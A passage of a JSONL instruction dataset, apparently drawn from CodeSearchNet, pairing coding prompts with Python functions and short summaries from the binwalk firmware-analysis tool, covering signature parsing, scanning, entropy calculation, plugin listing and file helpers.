greater than the previously processed kwarg's priority,\n                    # then let's process it.\n                    if not has_key(last_priority, name) or last_priority[name] <= module_option.priority:\n\n                        # Track the priority for future iterations that may\n                        # process the same kwarg name\n                        last_priority[name] = module_option.priority\n\n                        try:\n                            kwargs[name] = module_option.convert(args[module_option.long], default_value)\n                        except KeyboardInterrupt as e:\n                            raise e\n                        except Exception as e:\n                            raise ModuleException(\"Invalid usage: %s\" % str(e))\n\n        binwalk.core.common.debug(\"%s :: %s => %s\" % (module.TITLE, str(argv), str(kwargs)))\n        return kwargs"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nprocess a module s kwargs. All modules should use this for kwarg processing.", "response": "def kwargs(self, obj, kwargs):\n        '''\n        Processes a module's kwargs. All modules should use this for kwarg processing.\n\n        @obj    - An instance of the module (e.g., self)\n        @kwargs - The kwargs passed to the module\n\n        Returns None.\n        '''\n        if hasattr(obj, \"KWARGS\"):\n            for module_argument in obj.KWARGS:\n                if has_key(kwargs, module_argument.name):\n                    arg_value = kwargs[module_argument.name]\n                else:\n                    arg_value = copy(module_argument.default)\n\n                setattr(obj, module_argument.name, arg_value)\n\n            for (k, v) in iterator(kwargs):\n                if not hasattr(obj, k):\n                    setattr(obj, k, v)\n        else:\n            raise Exception(\"binwalk.core.module.Modules.process_kwargs: %s has no attribute 'KWARGS'\" % str(obj))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nstarts the status server on the specified port.", "response": "def status_server(self, port):\n        '''\n        Starts the progress bar TCP service on the specified port.\n        This service will only be started once per instance, regardless of the\n        number of times this method is invoked.\n\n        Failure to start the status service is considered non-critical; that is,\n        a warning will be displayed to the user, but normal operation will proceed.\n        '''\n        if self.status_server_started == False:\n            self.status_server_started = True\n            try:\n                self.status_service = binwalk.core.statuserver.StatusServer(port, self)\n            except Exception as e:\n                binwalk.core.common.warning(\"Failed to start status server on port %d: %s\" % (port, str(e)))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _make_short(self, data, endianness):\n        data = binwalk.core.compat.str2bytes(data)\n        return struct.unpack('%sH' % endianness, data)[0]", "response": "Returns a 2 byte integer."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _get_fname_len(self, bufflen=128):\n        buff = self.meta.peek(bufflen)\n        strlen = buff.find('\\0')\n        for i, b in enumerate(buff[strlen:]):\n            if b != '\\0':\n                return strlen+i\n        return bufflen", "response": "Returns the number of bytes designated for the filename."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _get_node(self):\n        data = self.meta.read(self.node_size)\n        return PFSNode(data, self.endianness)", "response": "Reads a chunk of meta data from file and returns a PFSNode."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns an iterator over the file meta - data entries one by one.", "response": "def entries(self):\n        \"\"\"Returns file meta-data entries one by one.\"\"\"\n        self.meta.seek(self.file_list_start)\n        for i in range(0, self.num_files):\n            yield self._get_node()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nextracting the actual string from the available bytes.", "response": "def _decode_fname(self):\n        \"\"\"Extracts the actual string from the available bytes.\"\"\"\n        self.fname = self.fname[:self.fname.find('\\0')]\n        self.fname = self.fname.replace('\\\\', '/')"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _generate_regex(self, line):\n        '''\n        Generates a regular expression from the magic bytes of a signature.\n        The regex is used by Magic._analyze.\n\n        @line - The first SignatureLine object of the signature.\n\n        Returns a compile regular expression.\n        '''\n        restr = \"\"\n\n        # Strings and single byte signatures are taken at face value;\n        # multi-byte integer values are turned into regex strings based\n        # on their data type size and endianness.\n        if line.type == 'regex':\n            # Regex types are already compiled expressions.\n            # Note that since re.finditer is used, unless the specified\n            # regex accounts for it, overlapping signatures will be ignored.\n            return line.value\n        if line.type == 'string':\n            restr = line.value\n        elif line.size == 1:\n            restr = chr(line.value)\n        elif line.size == 2:\n            if line.endianness == '<':\n                restr = chr(line.value & 0xFF) + chr(line.value >> 8)\n            elif line.endianness == '>':\n                restr = chr(line.value >> 8) + chr(line.value & 0xFF)\n        elif line.size == 4:\n            if line.endianness == '<':\n                restr = (chr(line.value & 0xFF) +\n                         chr((line.value >> 8) & 0xFF) +\n                         chr((line.value >> 16) & 0xFF) +\n                         chr(line.value >> 24))\n            elif line.endianness == '>':\n                restr = (chr(line.value >> 24) +\n                         chr((line.value >> 16) & 0xFF) +\n                         chr((line.value >> 8) & 0xFF) +\n                         chr(line.value & 0xFF))\n        elif line.size == 8:\n            if line.endianness == '<':\n                restr = (chr(line.value & 0xFF) +\n                         chr((line.value >> 8) & 0xFF) +\n                         chr((line.value >> 16) & 0xFF) +\n                         chr((line.value >> 24) & 0xFF) +\n                         chr((line.value >> 32) & 0xFF) +\n                         chr((line.value >> 40) & 0xFF) +\n                         chr((line.value >> 48) & 0xFF) +\n                         chr(line.value >> 56))\n            elif line.endianness == '>':\n                restr = (chr(line.value >> 56) +\n                         chr((line.value >> 48) & 0xFF) +\n                         chr((line.value >> 40) & 0xFF) +\n                         chr((line.value >> 32) & 0xFF) +\n                         chr((line.value >> 24) & 0xFF) +\n                         chr((line.value >> 16) & 0xFF) +\n                         chr((line.value >> 8) & 0xFF) +\n                         chr(line.value & 0xFF))\n\n        # Since re.finditer is used on a per-signature basis, signatures should be crafted carefully\n        # to ensure that they aren't potentially self-overlapping (e.g., a signature of \"ABCDAB\" could\n        # be confused by the byte sequence \"ABCDABCDAB\"). The longer the signature, the less likely an\n        # unintentional overlap is, although files could still be maliciously crafted to cause false\n        # negative results.\n        #\n        # Thus, unless a signature has been explicitly marked as knowingly overlapping ('{overlap}'),\n        # spit out a warning about any self-overlapping signatures.\n        if not binwalk.core.compat.has_key(line.tags, 'overlap'):\n            for i in range(1, line.size):\n                if restr[i:] == restr[0:(line.size - i)]:\n                    binwalk.core.common.warning(\"Signature '%s' is a self-overlapping signature!\" % line.text)\n                    break\n\n        return re.compile(re.escape(restr))", "response": "Generates a regular expression from the magic bytes of a signature."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _filtered(self, text):\n        '''\n        Tests if a string should be filtered out or not.\n\n        @text - The string to check against filter rules.\n\n        Returns True if the string should be filtered out, i.e., not displayed.\n        Returns False if the string should be displayed.\n        '''\n        filtered = None\n        # Text is converted to lower case first, partially for historical\n        # purposes, but also because it simplifies writing filter rules\n        # (e.g., don't have to worry about case sensitivity).\n        text = text.lower()\n\n        for include in self.includes:\n            if include.search(text):\n                filtered = False\n                break\n\n        # If exclusive include filters have been specified and did\n        # not match the text, then the text should be filtered out.\n        if self.includes and filtered == None:\n            return True\n\n        for exclude in self.excludes:\n            if exclude.search(text):\n                filtered = True\n                break\n\n        # If no explicit exclude filters were matched, then the\n        # text should *not* be filtered.\n        if filtered == None:\n            filtered = False\n\n        return filtered", "response": "Tests if a string should be filtered out or not."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _do_math(self, offset, expression):\n        '''\n        Parses and evaluates complex expressions, e.g., \"(4.l+12)\", \"(6*32)\", etc.\n\n        @offset      - The offset inside self.data that the current signature starts at.\n        @expressions - The expression to evaluate.\n\n        Returns an integer value that is the result of the evaluated expression.\n        '''\n        # Does the expression contain an offset (e.g., \"(4.l+12)\")?\n        if '.' in expression and '(' in expression:\n            replacements = {}\n\n            for period in [match.start() for match in self.period.finditer(expression)]:\n                # Separate the offset field into the integer offset and type\n                # values (o and t respsectively)\n                s = expression[:period].rfind('(') + 1\n                # The offset address may be an evaluatable expression, such as '(4+0.L)', typically the result\n                # of the original offset being something like '(&0.L)'.\n                o = binwalk.core.common.MathExpression(expression[s:period]).value\n                t = expression[period + 1]\n\n                # Re-build just the parsed offset portion of the expression\n                text = \"%s.%c\" % (expression[s:period], t)\n\n                # Have we already evaluated this offset expression? If so, skip\n                # it.\n                if binwalk.core.common.has_key(replacements, text):\n                    continue\n\n                # The offset specified in the expression is relative to the\n                # starting offset inside self.data\n                o += offset\n\n                # Read the value from self.data at the specified offset\n                try:\n                    # Big and little endian byte format\n                    if t in ['b', 'B']:\n                        v = struct.unpack('b', binwalk.core.compat.str2bytes(self.data[o:o + 1]))[0]\n                    # Little endian short format\n                    elif t == 's':\n                        v = struct.unpack('<h', binwalk.core.compat.str2bytes(self.data[o:o + 2]))[0]\n                    # Little endian long format\n                    elif t == 'l':\n                        v = struct.unpack('<i', binwalk.core.compat.str2bytes(self.data[o:o + 4]))[0]\n                    # Big endian short format\n                    elif t == 'S':\n                        v = struct.unpack('>h', binwalk.core.compat.str2bytes(self.data[o:o + 2]))[0]\n                    # Bit endian long format\n                    elif t == 'L':\n                        v = struct.unpack('>i', binwalk.core.compat.str2bytes(self.data[o:o + 4]))[0]\n                # struct.error is thrown if there is not enough bytes in\n                # self.data for the specified format type\n                except struct.error as e:\n                    v = 0\n\n                # Keep track of all the recovered values from self.data\n                replacements[text] = v\n\n            # Finally, replace all offset expressions with their corresponding\n            # text value\n            v = expression\n            for (text, value) in binwalk.core.common.iterator(replacements):\n                v = v.replace(text, \"%d\" % value)\n\n        # If no offset, then it's just an evaluatable math expression (e.g.,\n        # \"(32+0x20)\")\n        else:\n            v = expression\n\n        # Evaluate the final expression\n        value = binwalk.core.common.MathExpression(v).value\n\n        return value", "response": "Parse and evaluate a complex expression and return the value of the expression."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _analyze(self, signature, offset):\n        '''\n        Analyzes self.data for the specified signature data at the specified offset .\n\n        @signature - The signature to apply to the data.\n        @offset    - The offset in self.data to apply the signature to.\n\n        Returns a dictionary of tags parsed from the data.\n        '''\n        description = []\n        max_line_level = 0\n        previous_line_end = 0\n        tags = {'id': signature.id, 'offset':\n                offset, 'invalid': False, 'once': False}\n\n        # Apply each line of the signature to self.data, starting at the\n        # specified offset\n        for n in range(0, len(signature.lines)):\n            line = signature.lines[n]\n\n            # Ignore indentation levels above the current max indent level\n            if line.level <= max_line_level:\n                # If the relative offset of this signature line is just an\n                # integer value, use it\n                if isinstance(line.offset, int):\n                    line_offset = line.offset\n                # Else, evaluate the complex expression\n                else:\n                    # Format the previous_line_end value into a string. Add the '+' sign to explicitly\n                    # state that this value is to be added to any subsequent values in the expression\n                    # (e.g., '&0' becomes '4+0').\n                    ple = '%d+' % previous_line_end\n                    # Allow users to use either the '&0' (libmagic) or '&+0' (explcit addition) sytaxes;\n                    # replace both with the ple text.\n                    line_offset_text = line.offset.replace('&+', ple).replace('&', ple)\n                    # Evaluate the expression\n                    line_offset = self._do_math(offset, line_offset_text)\n\n                # Sanity check\n                if not isinstance(line_offset, int):\n                    raise ParserException(\"Failed to convert offset '%s' to a number: '%s'\" % (line.offset, line.text))\n\n                # The start of the data needed by this line is at offset + line_offset.\n                # The end of the data will be line.size bytes later.\n                start = offset + line_offset\n                end = start + line.size\n\n                # If the line has a packed format string, unpack it\n                if line.pkfmt:\n                    try:\n                        dvalue = struct.unpack(line.pkfmt, binwalk.core.compat.str2bytes(self.data[start:end]))[0]\n                    # Not enough bytes left in self.data for the specified\n                    # format size\n                    except struct.error as e:\n                        dvalue = 0\n                # Else, this is a string\n                else:\n                    # Wildcard strings have line.value == None\n                    if line.value is None:\n                        # Check to see if this is a string whose size is known and has been specified on a previous\n                        # signature line.\n                        if binwalk.core.compat.has_key(tags, 'strlen') and binwalk.core.compat.has_key(line.tags, 'string'):\n                            dvalue = self.data[start:(start + tags['strlen'])]\n                        # Else, just terminate the string at the first newline,\n                        # carriage return, or NULL byte\n                        else:\n                            dvalue = self.data[start:end].split('\\x00')[0].split('\\r')[0].split('\\n')[0]\n                    # Non-wildcard strings have a known length, specified in\n                    # the signature line\n                    else:\n                        dvalue = self.data[start:end]\n\n                # Some integer values have special operations that need to be performed on them\n                # before comparison (e.g., \"belong&0x0000FFFF\"). Complex math expressions are\n                # supported here as well.\n                # if isinstance(dvalue, int) and line.operator:\n                if line.operator:\n                    try:\n                        # If the operator value of this signature line is just\n                        # an integer value, use it\n                        if isinstance(line.opvalue, int) or isinstance(line.opvalue, long):\n                            opval = line.opvalue\n                        # Else, evaluate the complex expression\n                        else:\n                            opval = self._do_math(offset, line.opvalue)\n\n                        # Perform the specified operation\n                        if line.operator == '&':\n                            dvalue &= opval\n                        elif line.operator == '|':\n                            dvalue |= opval\n                        elif line.operator == '*':\n                            dvalue *= opval\n                        elif line.operator == '+':\n                            dvalue += opval\n                        elif line.operator == '-':\n                            dvalue -= opval\n                        elif line.operator == '/':\n                            dvalue /= opval\n                        elif line.operator == '~':\n                            dvalue = ~opval\n                        elif line.operator == '^':\n                            dvalue ^= opval\n                    except KeyboardInterrupt as e:\n                        raise e\n                    except Exception as e:\n                        raise ParserException(\"Operation '\" +\n                                              str(dvalue) +\n                                              \" \" +\n                                              str(line.operator) +\n                                              \"= \" +\n                                              str(line.opvalue) +\n                                              \"' failed: \" + str(e))\n\n                # Does the data (dvalue) match the specified comparison?\n                if ((line.value is None) or\n                    (line.regex and line.value.match(dvalue)) or\n                    (line.condition == '=' and dvalue == line.value) or\n                    (line.condition == '>' and dvalue > line.value) or\n                    (line.condition == '<' and dvalue < line.value) or\n                    (line.condition == '!' and dvalue != line.value) or\n                    (line.condition == '~' and (dvalue == ~line.value)) or\n                    (line.condition == '^' and (dvalue ^ line.value)) or\n                    (line.condition == '&' and (dvalue & line.value)) or\n                        (line.condition == '|' and (dvalue | line.value))):\n\n                    # Up until this point, date fields are treated as integer values,\n                    # but we want to display them as nicely formatted strings.\n                    if line.type == 'date':\n                        try:\n                            ts = datetime.datetime.utcfromtimestamp(dvalue)\n                            dvalue = ts.strftime(\"%Y-%m-%d %H:%M:%S\")\n                        except KeyboardInterrupt as e:\n                            raise e\n                        except Exception:\n                            dvalue = \"invalid timestamp\"\n\n                    # Generate the tuple for the format string\n                    dvalue_tuple = ()\n                    for x in self.fmtstr.finditer(line.format):\n                        dvalue_tuple += (dvalue,)\n\n                    # Format the description string\n                    desc = line.format % dvalue_tuple\n\n                    # If there was any description string, append it to the\n                    # list of description string parts\n                    if desc:\n                        description.append(desc)\n\n                    # Process tag keywords specified in the signature line. These have already been parsed out of the\n                    # original format string so that they can be processed\n                    # separately from the printed description string.\n                    for (tag_name, tag_value) in binwalk.core.compat.iterator(line.tags):\n                        # If the tag value is a string, try to format it\n                        if isinstance(tag_value, str):\n                            # Generate the tuple for the format string\n                            dvalue_tuple = ()\n                            for x in self.fmtstr.finditer(tag_value):\n                                dvalue_tuple += (dvalue,)\n\n                            # Format the tag string\n                            tags[tag_name] = tag_value % dvalue_tuple\n                        # Else, just use the raw tag value\n                        else:\n                            tags[tag_name] = tag_value\n\n                        # Some tag values are intended to be integer values, so\n                        # try to convert them as such\n                        try:\n                            tags[tag_name] = int(tags[tag_name], 0)\n                        except KeyboardInterrupt as e:\n                            raise e\n                        except Exception as e:\n                            pass\n\n                    # Abort processing soon as this signature is marked invalid, unless invalid results\n                    # were explicitly requested. This means that the sooner invalid checks are made in a\n                    # given signature, the faster the scan can filter out false\n                    # positives.\n                    if not self.show_invalid and tags['invalid']:\n                        break\n\n                    # Look ahead to the next line in the signature; if its indent level is greater than\n                    # that of the current line, then track the end of data for the current line. This is\n                    # so that subsequent lines can use the '>>&0' offset syntax to specify relative offsets\n                    # from previous lines.\n                    try:\n                        next_line = signature.lines[n + 1]\n                        if next_line.level > line.level:\n                            if line.type == 'string':\n                                previous_line_end = line_offset + len(dvalue)\n                            else:\n                                previous_line_end = line_offset + line.size\n                    except IndexError as e:\n                        pass\n\n                    # If this line satisfied its comparison, +1 the max\n                    # indentation level\n                    max_line_level = line.level + 1\n                else:\n                    # No match on the first line, abort\n                    if line.level == 0:\n                        break\n                    else:\n                        # If this line did not satisfy its comparison, then higher\n                        # indentation levels will not be accepted.\n                        max_line_level = line.level\n\n        # Join the formatted description strings and remove backspace\n        # characters (plus the preceeding character as well)\n        tags['description'] = self.bspace.sub('', \" \".join(description))\n\n        # This should never happen\n        if not tags['description']:\n            tags['display'] = False\n            tags['invalid'] = True\n\n        # If the formatted string contains non-printable characters, consider\n        # it invalid\n        if self.printable.match(tags['description']).group() != tags['description']:\n            tags['invalid'] = True\n\n        return tags", "response": "Analyzes the data for the specified signature at the specified offset."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef scan(self, data, dlen=None):\n        '''\n        Scan a data block for matching signatures.\n\n        @data - A string of data to scan.\n        @dlen - If specified, signatures at offsets larger than dlen will be ignored.\n\n        Returns a list of SignatureResult objects.\n        '''\n        results = []\n        matched_offsets = set()\n\n        # Since data can potentially be quite a large string, make it available to other\n        # methods via a class attribute so that it doesn't need to be passed around to\n        # different methods over and over again.\n        self.data = data\n\n        # If dlen wasn't specified, search all of self.data\n        if dlen is None:\n            dlen = len(data)\n\n        for signature in self.signatures:\n            # Use regex to search the data block for potential signature\n            # matches (fast)\n            for match in signature.regex.finditer(data):\n                # Take the offset of the start of the signature into account\n                offset = match.start() - signature.offset\n\n                # Signatures are ordered based on the length of their magic bytes (largest first).\n                # If this offset has already been matched to a previous signature, ignore it unless\n                # self.show_invalid has been specified. Also ignore obviously invalid offsets (<0)\n                # as well as those outside the specified self.data range (dlen).\n                if (offset not in matched_offsets or self.show_invalid) and offset >= 0 and offset < dlen:\n                # if offset >= 0 and offset < dlen:\n                    # Analyze the data at this offset using the current\n                    # signature rule\n                    tags = self._analyze(signature, offset)\n\n                    # Generate a SignatureResult object and append it to the results list if the\n                    # signature is valid, or if invalid results were requested.\n                    if (not tags['invalid'] or self.show_invalid) and not self._filtered(tags['description']):\n                        # Only display results with the 'once' tag once.\n                        if tags['once']:\n                            if signature.title in self.display_once:\n                                continue\n                            else:\n                                self.display_once.add(signature.title)\n\n                        # Append the result to the results list\n                        results.append(SignatureResult(**tags))\n\n                        # Add this offset to the matched_offsets set, so that it can be ignored by\n                        # subsequent loops.\n                        matched_offsets.add(offset)\n\n        # Sort results by offset\n        results.sort(key=lambda x: x.offset, reverse=False)\n\n        return results", "response": "Scan a data block for matching signatures."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nloads signatures from a file.", "response": "def load(self, fname):\n        '''\n        Load signatures from a file.\n\n        @fname - Path to signature file.\n\n        Returns None.\n        '''\n        # Magic files must be ASCII, else encoding issues can arise.\n        fp = open(fname, \"r\")\n        lines = fp.readlines()\n        self.parse(lines)\n        fp.close()"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nparsing the signature file lines.", "response": "def parse(self, lines):\n        '''\n        Parse signature file lines.\n\n        @lines - A list of lines from a signature file.\n\n        Returns None.\n        '''\n        signature = None\n\n        for line in lines:\n            # Split at the first comment delimiter (if any) and strip the\n            # result\n            line = line.split('#')[0].strip()\n            # Ignore blank lines and lines that are nothing but comments.\n            # We also don't support the '!mime' style line entries.\n            if line and line[0] != '!':\n                # Parse this signature line\n                sigline = SignatureLine(line)\n                # Level 0 means the first line of a signature entry\n                if sigline.level == 0:\n                    # If there is an existing signature, append it to the signature list,\n                    # unless the text in its title field has been filtered by user-defined\n                    # filter rules.\n                    if signature and not self._filtered(signature.title):\n                        self.signatures.append(signature)\n\n                    # Create a new signature object; use the size of self.signatures to\n                    # assign each signature a unique ID.\n                    signature = Signature(len(self.signatures), sigline)\n                # Else, just append this line to the existing signature\n                elif signature:\n                    # signature.append(sigline)\n                    signature.lines.append(sigline)\n                # If this is not the first line of a signature entry and there is no other\n                # existing signature entry, something is very wrong with the\n                # signature file.\n                else:\n                    raise ParserException(\"Invalid signature line: '%s'\" % line)\n\n        # Add the final signature to the signature list\n        if signature:\n            if not self._filtered(signature.lines[0].format):\n                self.signatures.append(signature)\n\n        # Sort signatures by confidence (aka, length of their magic bytes),\n        # largest first\n        self.signatures.sort(key=lambda x: x.confidence, reverse=True)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _set_verbosity(self):\n        '''\n        Sets the appropriate verbosity.\n        Must be called after self._test_target_files so that self.target_files is properly set.\n        '''\n        # If more than one target file was specified, enable verbose mode; else, there is\n        # nothing in some outputs to indicate which scan corresponds to which\n        # file.\n        if len(self.target_files) > 1 and not self.verbose:\n            self.verbose = True", "response": "Sets the appropriate verbosity."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncheck to see if a file should be scanned based on file name include and exclude filters.", "response": "def file_name_filter(self, fp):\n        '''\n        Checks to see if a file should be scanned based on file name include/exclude filters.\n        Most useful for matryoshka scans where only certian files are desired.\n\n        @fp - An instances of binwalk.common.BlockFile\n\n        Returns True if the file should be scanned, False if not.\n        '''\n        if self.file_name_include_regex and not self.file_name_include_regex.search(fp.name):\n            return False\n        if self.file_name_exclude_regex and self.file_name_exclude_regex.search(fp.name):\n            return False\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nopens the specified file with all pertinent configuration settings.", "response": "def open_file(self, fname, length=None, offset=None, swap=None, block=None, peek=None):\n        '''\n        Opens the specified file with all pertinent configuration settings.\n        '''\n        if length is None:\n            length = self.length\n        if offset is None:\n            offset = self.offset\n        if swap is None:\n            swap = self.swap_size\n\n        return binwalk.core.common.BlockFile(fname,\n                                             subclass=self.subclass,\n                                             length=length,\n                                             offset=offset,\n                                             swap=swap,\n                                             block=block,\n                                             peek=peek)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _open_target_files(self):\n        '''\n        Checks if the target files can be opened.\n        Any files that cannot be opened are removed from the self.target_files list.\n        '''\n        # Validate the target files listed in target_files\n        for tfile in self.files:\n            # Ignore directories.\n            if not self.subclass == io.FileIO or not os.path.isdir(tfile):\n                # Make sure we can open the target files\n                try:\n                    fp = self.open_file(tfile)\n                    fp.close()\n                    self.target_files.append(tfile)\n                except KeyboardInterrupt as e:\n                    raise e\n                except Exception as e:\n                    self.error(description=\"Cannot open file %s (CWD: %s) : %s\" % (tfile, os.getcwd(), str(e)))", "response": "Checks if the target files can be opened."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nvalidates the result of a single entry.", "response": "def validate(self, r):\n        '''\n        Called automatically by self.result.\n        '''\n        if self.show_invalid:\n            r.valid = True\n        elif r.valid:\n            if not r.description:\n                r.valid = False\n\n            if r.size and (r.size + r.offset) > r.file.size:\n                r.valid = False\n\n            if r.jump and (r.jump + r.offset) > r.file.size:\n                r.valid = False\n\n            if hasattr(r, \"location\") and (r.location != r.offset):\n                r.valid = False\n\n        if r.valid:\n            # Don't keep displaying signatures that repeat a bunch of times\n            # (e.g., JFFS2 nodes)\n            if r.id == self.one_of_many:\n                r.display = False\n            elif r.many:\n                self.one_of_many = r.id\n            else:\n                self.one_of_many = None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nobtain a list of all user and system plugin modules.", "response": "def list_plugins(self):\n        '''\n        Obtain a list of all user and system plugin modules.\n\n        Returns a dictionary of:\n\n            {\n                'user'      : {\n                            'modules'       : [list, of, module, names],\n                            'descriptions'  : {'module_name' : 'module pydoc string'},\n                            'enabled'       : {'module_name' : True},\n                            'path'          : \"path/to/module/plugin/directory\"\n                },\n                'system'    : {\n                            'modules'       : [list, of, module, names],\n                            'descriptions'  : {'module_name' : 'module pydoc string'},\n                            'enabled'       : {'module_name' : True},\n                            'path'          : \"path/to/module/plugin/directory\"\n                }\n            }\n        '''\n\n        plugins = {\n            'user': {\n                'modules': [],\n                'descriptions': {},\n                'enabled': {},\n                'path': None,\n            },\n            'system': {\n                'modules': [],\n                'descriptions': {},\n                'enabled': {},\n                'path': None,\n            }\n        }\n\n        for key in plugins.keys():\n            if key == 'user':\n                plugins[key]['path'] = self.settings.user.plugins\n            else:\n                plugins[key]['path'] = self.settings.system.plugins\n\n            if plugins[key]['path']:\n                for file_name in os.listdir(plugins[key]['path']):\n                    if file_name.endswith(self.MODULE_EXTENSION):\n                        module = file_name[:-len(self.MODULE_EXTENSION)]\n\n                        try:\n                            plugin = imp.load_source(module, os.path.join(plugins[key]['path'], file_name))\n                            plugin_class = self._find_plugin_class(plugin)\n\n                            plugins[key]['enabled'][module] = True\n                            plugins[key]['modules'].append(module)\n                        except KeyboardInterrupt as e:\n                            raise e\n                        # Python files in the plugins directory that are not\n                        # actually binwalk plugins will generate a TypeError\n                        # about converting an object to a string implicitly.\n                        # Don't need to warn about these.\n                        except TypeError:\n                            pass\n                        except Exception as e:\n                            binwalk.core.common.warning(\"Error loading plugin '%s': %s\" % (file_name, str(e)))\n                            plugins[key]['enabled'][module] = False\n\n                        try:\n                            plugins[key]['descriptions'][\n                                module] = plugin_class.__doc__.strip().split('\\n')[0]\n                        except KeyboardInterrupt as e:\n                            raise e\n                        except Exception as e:\n                            plugins[key]['descriptions'][\n                                module] = 'No description'\n        return plugins"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncalculates Shannon entropy on a given block of data.", "response": "def shannon(self, data):\n        '''\n        Performs a Shannon entropy analysis on a given block of data.\n        '''\n        entropy = 0\n\n        if data:\n            length = len(data)\n\n            seen = dict(((chr(x), 0) for x in range(0, 256)))\n            for byte in data:\n                seen[byte] += 1\n\n            for x in range(0, 256):\n                p_x = float(seen[chr(x)]) / length\n                if p_x > 0:\n                    entropy -= p_x * math.log(p_x, 2)\n\n        return (entropy / 8)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef gzip(self, data, truncate=True):\n        '''\n        Performs an entropy analysis based on zlib compression ratio.\n        This is faster than the shannon entropy analysis, but not as accurate.\n        '''\n        # Entropy is a simple ratio of: <zlib compressed size> / <original\n        # size>\n        e = float(float(len(zlib.compress(str2bytes(data), 9))) / float(len(data)))\n\n        if truncate and e > 1.0:\n            e = 1.0\n\n        return e", "response": "Calculates the entropy of a file."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef nts(self, s):\n        # Use the string up to the first null char.\n        p = s.find(\"\\0\")\n        if p == -1:\n            return s\n        return s[:p]", "response": "Convert a null - terminated string field to a python string."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef nti(self, s):\n        # There are two possible encodings for a number field, see\n        # itn() below.\n        if s[0] != chr(0x80):\n            try:\n                n = int(self.nts(s) or \"0\", 8)\n            except ValueError:\n                raise ValueError(\"invalid tar header\")\n        else:\n            n = 0\n            for i in xrange(len(s) - 1):\n                n <<= 8\n                n += ord(s[i + 1])\n        return n", "response": "Convert a number field to a python number."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef debug(msg):\n    '''\n    Displays debug messages to stderr only if the Python interpreter was invoked with the -O flag.\n    '''\n    if DEBUG:\n        sys.stderr.write(\"DEBUG: \" + msg + \"\\n\")\n        sys.stderr.flush()", "response": "Displays debug messages to stderr only if DEBUG is set to True."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating an MD5 hash of the specified file.", "response": "def file_md5(file_name):\n    '''\n    Generate an MD5 hash of the specified file.\n\n    @file_name - The file to hash.\n\n    Returns an MD5 hex digest string.\n    '''\n    md5 = hashlib.md5()\n\n    with open(file_name, 'rb') as f:\n        for chunk in iter(lambda: f.read(128 * md5.block_size), b''):\n            md5.update(chunk)\n\n    return md5.hexdigest()"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef file_size(filename):\n    '''\n    Obtains the size of a given file.\n\n    @filename - Path to the file.\n\n    Returns the size of the file.\n    '''\n    # Using open/lseek works on both regular files and block devices\n    fd = os.open(filename, os.O_RDONLY)\n    try:\n        return os.lseek(fd, 0, os.SEEK_END)\n    except KeyboardInterrupt as e:\n        raise e\n    except Exception as e:\n        raise Exception(\n            \"file_size failed to obtain the size of '%s': %s\" % (filename, str(e)))\n    finally:\n        os.close(fd)", "response": "Returns the size of a given file."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a string comprised of all data in between double quotes.", "response": "def get_quoted_strings(quoted_string):\n    '''\n    Returns a string comprised of all data in between double quotes.\n\n    @quoted_string - String to get quoted data from.\n\n    Returns a string of quoted data on success.\n    Returns a blank string if no quoted data is present.\n    '''\n    try:\n        # This regex grabs all quoted data from string.\n        # Note that this gets everything in between the first and last double quote.\n        # This is intentional, as printed (and quoted) strings from a target file may contain\n        # double quotes, and this function should ignore those. However, it also means that any\n        # data between two quoted strings (ex: '\"quote 1\" non-quoted data\n        # \"quote 2\"') will also be included.\n        return re.findall(r'\\\"(.*)\\\"', quoted_string)[0]\n    except KeyboardInterrupt as e:\n        raise e\n    except Exception:\n        return ''"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a unique file name based on the specified base name and extension.", "response": "def unique_file_name(base_name, extension=''):\n    '''\n    Creates a unique file name based on the specified base name.\n\n    @base_name - The base name to use for the unique file name.\n    @extension - The file extension to use for the unique file name.\n\n    Returns a unique file string.\n    '''\n    idcount = 0\n\n    if extension and not extension.startswith('.'):\n        extension = '.%s' % extension\n\n    fname = base_name + extension\n\n    while os.path.exists(fname):\n        fname = \"%s-%d%s\" % (base_name, idcount, extension)\n        idcount += 1\n\n    return fname"}
